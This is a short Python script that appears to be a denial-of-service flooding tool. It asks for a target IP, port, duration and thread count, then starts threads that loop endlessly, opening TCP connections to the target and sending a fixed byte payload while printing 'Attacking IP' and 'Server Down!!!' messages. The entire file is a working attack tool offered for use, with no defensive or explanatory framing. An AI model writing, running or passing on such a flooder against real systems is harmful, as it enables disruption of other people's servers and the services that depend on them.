import random
import socket
import threading
import os, sys
import time


ip = str(input("IP : "))
port = int(input("Port : "))
times = int(input("Time : "))
threads = int(input("[+] Enter Thread [80]     : "))

def run():
    data = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("[!] Attacking IP => ",ip," With Port : ",port,"!")
        except socket.error:
            s.close()
            print(i + "Server Down!!!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()